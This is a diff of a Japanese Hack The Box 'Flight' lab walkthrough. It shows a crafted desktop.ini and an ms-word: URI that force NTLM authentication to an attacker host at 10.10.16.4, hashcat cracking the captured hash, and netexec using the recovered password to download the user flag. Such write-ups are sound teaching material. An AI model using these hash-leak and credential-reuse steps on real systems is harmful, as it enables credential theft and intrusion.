@@ -387,7 +387,7 @@ kaliにsmb認証を要求するファイルにアクセスした際、responder�
   location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
 Created: test/desktop.ini (BROWSE TO FOLDER)
 Generation Complete.
-                                                                                                                                                                       
+
 └─$ cat test/desktop.ini 
 [.ShellClassInfo]
 IconResource=\\10.10.16.4\aa 
@@ -482,3 +482,17 @@ c.bumのパスワードは「Tikkycoll_431012284」
 └─$ hashcat -a 0 -m 5600 c.bum.txt /usr/share/wordlists/rockyou.txt --quiet     
 C.BUM::flight.htb:40702e4077420c0e:394c704f40664b2dc0d4c9fb23557e61:01010000000000000009cd3e433ddc01d93aed061cb69bde00000000020008005a00460050004d0001001e00570049004e002d0036004400590052004100390053004c0044005100430004003400570049004e002d0036004400590052004100390053004c004400510043002e005a00460050004d002e004c004f00430041004c00030014005a00460050004d002e004c004f00430041004c00050014005a00460050004d002e004c004f00430041004c00070008000009cd3e433ddc0106000400020000000800300030000000000000000000000000300000ce4b0228dbb7891b107a33df935afc90d4d951b1c353270577762da1378815910a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:Tikkycoll_431012284
 ```
+c.bumのプロファイル内にユーザフラグ発見！
+```sh
+└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --share Users --get-file 'c.bum/desktop/user.txt' '/home/kali/user.txt'
+SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.200.222  445    G0               [*] Copying "c.bum/desktop/user.txt" to "/home/kali/user.txt"
+SMB         10.129.200.222  445    G0               [+] File "c.bum/desktop/user.txt" was downloaded to "/home/kali/user.txt"
+                                                                                                                                                                       
+└─$ cat user.txt 
+d8b9ecfbaa5e71842169b964146d25ff
+```
+
+
+## STEP 6
